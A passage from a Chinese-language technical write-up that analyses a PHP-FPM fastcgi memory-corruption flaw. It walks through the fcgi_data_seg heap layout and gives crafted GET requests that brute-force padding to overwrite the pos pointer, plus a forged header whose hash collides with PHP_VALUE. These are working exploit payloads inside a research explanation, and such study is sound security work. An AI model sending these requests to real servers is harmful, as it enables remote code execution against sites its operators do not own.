@@ -1,0 +1,135 @@
+        memcpy(ret, str, str_len);
+        ret[str_len] = 0;
+        h->data->pos += str_len + 1; 
+        return ret;
+    }
+从这个代码中可以看出，`request.env.data` 对应的结构体:
+    typedef struct _fcgi_data_seg {
+        char                  *pos;
+        char                  *end;
+        struct _fcgi_data_seg *next;
+        char                   data[1];
+    } fcgi_data_seg;
+是专门用来存储 fastcgi 全局变量的变量名和变量值的一个结构。 如果对c语言比较熟悉，就会明白，这里的`char
+data[1]`并不是表明此元素只占一个字节，这是c语言中定义包含不定长字符串的结构体的常用方法。pos 始终指向了data未使用空间的起始位置。
+我感觉我还是没说清楚，画个图吧,假设存储了全局变量 `PATH_INFO`之后(为了方便看，我把data字段横着放了)
+    +---------------------+
+    |        pos          |--------------------------------------------+  
+    +---------------------+                                            |
+    |        end          |                                            |
+    +---------------------+                                            |
+    |      next = 0       |                                            |
+    +---------------------+-------------------------|------------------+-------——+
+    |      data = xxxx    |SCRIPT_NAME\0/index.php\0|PATH_INFO\0/test\0|未使用空间 |
+    +---------------------+-------------------------|------------------+---------+
+这也就可以解释为什么所有的全局变量对应的 `fcgi_hash_buckets` 中的 `var`和`val`的值总是连续的地址空间。
+根据  中的漏洞描述，他是修改了 `fcgi_hash_buckets`
+结构中 `pos` 的最低位，实现的`request`全局变量的污染。我们再来看一下函数 `fcgi_hash_strndup`,如果可以控制`ret =
+h->data->pos;` 那么就可以控制 `memcpy(ret, str, str_len);`的写入位置，肯定有机会实现全局变量的污染。
+那接下来就需要分析一下可行性了：
+  1. `env_path_info` 指针向前移动，有机会指向 `fcgi_data_seg.pos`的位置吗？ 
+答案是肯定的，因为 `env_path_info`
+指向了`fcgi_data_seg.data`中间的某个位置，他们都是在`fcgi_data_seg`结构体空间内的，
+这是一个相差不太远的线性空间，只要控制合适的偏移，一定可以指向`fcgi_data_seg.pos`的低字节。
+  1. 只有 `fcgi_hash_strndup` 被调用之后，才会进行`memcpy`,在我们上面提到的第二个限制条件下，`fcgi_hash_strndup` 会被调用到吗？
+分析一下代码会发现，只有当注册新的fastcgi全局变量的时候，才会调用`fcgi_hash_strndup`,但是非常的凑巧，`FCGI_PUTENV(request,
+"ORIG_SCRIPT_NAME", orig_script_name);` 正好注册了新的变量 `ORIG_SCRIPT_NAME`。
+这个真是太凑巧了，没有这个函数调用，此漏洞根本没有办法被这么利用。
+### 0x5 巧妙的EXP
+**接下来的部分才是这篇文章最有意思的部分**
+经过上面的分析，我们已经从理论上证明了可以污染`request`，但是我们没法实现攻击，因为不知道 `env_path_info`相对于
+`fcgi_data_seg.pos`的偏移，另外环境不一样，这个偏移也不会是个恒定值。 那能不能让它变成一个恒定值呢？
+我们想一下 `env_path_info`相对于 `fcgi_data_seg.pos`
+之间偏移不确定的主要原因是什么？是因为我们不清楚`env_path_info` 之前的位置都存储了哪些全局变量的 var 和 val，他们是多长。但是如果
+`PATH_INFO`全局变量可以存储在 `fcgi_data_seg.data`的开头，那情况就不一样了,如下图所示：
+    char *pos 
+    -------------  +8
+    char *end 
+    -------------  +8
+    char *next 
+    -------------  +8
+    PATH_INFO\x00 
+    -------------  +10
+    \x00           data->pos + str_len + 1 >= h->data->end)) { //FCGI_HASH_SEG_SIZE =  4096 
+            unsigned int seg_size = (str_len + 1 > FCGI_HASH_SEG_SIZE) ? str_len + 1 : FCGI_HASH_SEG_SIZE;
+            fcgi_data_seg *p = (fcgi_data_seg*)malloc(sizeof(fcgi_data_seg) - 1 + seg_size);
+            p->pos = p->data;
+            p->end = p->pos + seg_size;
+            p->next = h->data;
+            h->data = p;
+        }
+        ret = h->data->pos; // 获取起始位置
+        memcpy(ret, str, str_len);
+        ret[str_len] = 0;
+        h->data->pos += str_len + 1; 
+        return ret;
+    }
+初始化的时候 `fcgi_data_seg` 的结构体大小是 `sizeof(fcgi_data_seg) - 1 + seg_size` ，考虑一下
+0x10 对齐，所以大小应该是 `4096+32` 。 如果在存储 `PATH_INFO` 的时候，刚好空间不够用，也就是 `h->data->pos +
+str_len + 1 >= h->data->end`，那么就会触发一次malloc，分配一块新的chunk，并且 `PATH_INFO`
+就会存储在这个堆块的首部。
+但是攻击者是盲测的，攻击者怎么知道什么时候触发了 `malloc` ？有没有什么标志特征呢？这就要看这个巧妙的poc了。
+    GET /index.php/PHP%0Ais_the_shittiest_lang.php?QQQQQQQQQQQQQQQQQQQ... HTTP/1.1
+    Host: localhost
+    User-Agent: Mozilla/5.0
+    D-Pisos: 8=D
+    Ebut: mamku tvoyu
+利用这个payload，爆破 Q 的个数，直到 php-fpm 产生一次crash( 也就是返回404状态的时候),就说明产生了
+`malloc`。为什么是这样的？
+首先需要知道 Q 会在fastcgi的两个全局变量中出现,分别是 `QUERY_STRING` 和 `REQUEST_URI`两个地方出现。
+增加 Q 的个数，势必会占用之前的 `fcgi_data_seg.data` 的存储空间，导致在存储 `PATH_INFO`
+的时候，原本的空间不够用，malloc新的空间。但是为什么 crash 的时候，就一定进行了`malloc`操作了呢？
+这个精妙之处就需要看payload中的URL `/PHP%0Ais_the_shittiest_lang.php`, 此字符串的长度表示
+`env_path_info` 向前移动的字节数，这里长度是`30`, 可以计算一下 `env_path_info - 30` 刚好是
+`fcgi_data_seg.pos`
+的第五个字节,用户态的地址一般只用了六个字节，这里把第五个字节设置为`\x00`，一定会引起一个地址非法，所以就会造成一次崩溃。所以在崩溃的时候，肯定是发生了`malloc`，并且是修改掉了`fcgi_data_seg.pos`的第五个字节。
+造成第一次crash的payload如下:
+    GET /index.php/PHP%0Ais_the_shittiest_lang.php?QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ HTTP/1.1
+    Host: localhost
+    User-Agent: Mozilla/5.0
+    D-Pisos: 8=D
+    Ebut: mamku tvoyu
+已经修改成功了。
+好，我们尝试一下去修改pos的第一个字节，那么 `/PHP%0Ais_the_shittiest_lang.php` 应该被扩充到
+`34`个字节，尝试伪造请求如下：
+    GET /index.php/PHP%0Ais_the_shittiest_lang.phpxxxx?QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ HTTP/1.1
+    Host: localhost
+    User-Agent: Mozilla/5.0
+    D-Pisos: 8=D
+    Ebut: mamku tvoyu
+这下见证奇迹的时刻到了,在`b
+/usr/src/php/sapi/fpm/fpm/fpm_main.c:1220`上打上断点，然后单步进行调试，修改前如下图：
+修改后:
+哎，搞了这么久，终于把这个破 `pos` 指回去了，可以修改内存中的数据了。
+但是问题来了，我们修改点什么才能造成危害呢？ 首先想到的就是修改`PHP_VALUE` ，但是当前的全局变量中并没有 `PHP_VALUE` 啊,那怎么办？
+我们来看一下取全局变量的函数。
+    #define FCGI_GETENV(request, name) \
+        fcgi_quick_getenv(request, name, sizeof(name)-1, FCGI_HASH_FUNC(name, sizeof(name)-1))
+    char* fcgi_getenv(fcgi_request *req, const char* var, int var_len)
+    {
+        unsigned int val_len;
+        if (!req) return NULL;
+        return fcgi_hash_get(&req->env, FCGI_HASH_FUNC(var, var_len), (char*)var, var_len, &val_len);
+    }
+    static char *fcgi_hash_get(fcgi_hash *h, unsigned int hash_value, char *var, unsigned int var_len, unsigned int *val_len)
+    {
+        unsigned int      idx = hash_value & FCGI_HASH_TABLE_MASK;
+        fcgi_hash_bucket *p = h->hash_table[idx];
+        while (p != NULL) {
+            if (p->hash_value == hash_value &&
+                p->var_len == var_len &&
+                memcmp(p->var, var, var_len) == 0) {
+                *val_len = p->val_len;
+                return p->val;
+            }
+            p = p->next;
+        }
+        return NULL;
+    }
+我们需要伪造一个变量，它跟`PHP_VALUE`的hash一样，并且字符串长度相同，那么在取 `PHP_VALUE`
+的时候就会找到我们伪造的变量的idx索引，但是还是过不了`memcmp(p->var, var, var_len) == 0)`
+这个check，不过这个没有关系，我们不是有内存写吗？直接覆盖掉原来变量的`var`即可。
+EXP中伪造的变量是 `HTTP_EBUT` (http的头字段都会被加上 HTTP_ , 然后大写，注册成变量的),
+它和`PHP_VALUE`的长度相同，并且hash一样，不信你可以用hash函数算一下。
+    #define FCGI_HASH_FUNC(var, var_len) \
+        (UNEXPECTED(var_len   
